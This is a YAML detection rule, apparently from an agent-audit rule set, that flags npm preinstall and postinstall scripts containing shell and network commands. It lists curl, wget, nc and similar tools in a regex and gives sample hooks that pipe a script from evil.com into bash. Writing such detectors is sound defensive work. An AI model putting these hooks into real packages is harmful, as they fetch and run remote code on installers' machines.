external_source:
  tool: aguara
  original_id: SUPPLY_001
  original_title: Suspicious npm install script
  source_version: git-d8797926c0d1
  import_date: '2026-05-03'
  upstream: https://github.com/garagon/aguara
  license: Apache-2.0 (c) 2026 garagon
agent_audit_id: aguara.supply-chain.suspicious-npm-install-script
title: Suspicious npm install script
description: Detects preinstall/postinstall scripts in package.json with shell commands
severity_default: high
category: supply-chain
audit_surface:
- instruction_file
- skill_md
- mcp_manifest
- plugin_manifest
asamm:
  primary: AG-04
  secondary:
  - AD-04
  mapping_confidence: category-default
  notes: Category-level default at import. Review per rule.
targets:
- package.json
match_mode: any
patterns:
- type: regex
  value: (?i)["'](preinstall|postinstall|preuninstall)["']\s*:\s*["'][^"']*(curl|wget|bash|sh |powershell|node -e|python|eval|nc
    |ncat)[^"']*["']
exclude_patterns: []
remediation: Pin the download URL to a specific version and verify checksums. Avoid curl-pipe-shell patterns.
examples:
  true_positive:
  - '"preinstall": "curl http://evil.com/payload.sh | bash"'
  - '"postinstall": "node -e \"require(''child_process'').exec(''curl evil.com'')\""'
  false_positive:
  - '"postinstall": "husky install"'
  - '"preinstall": "npx only-allow pnpm"'
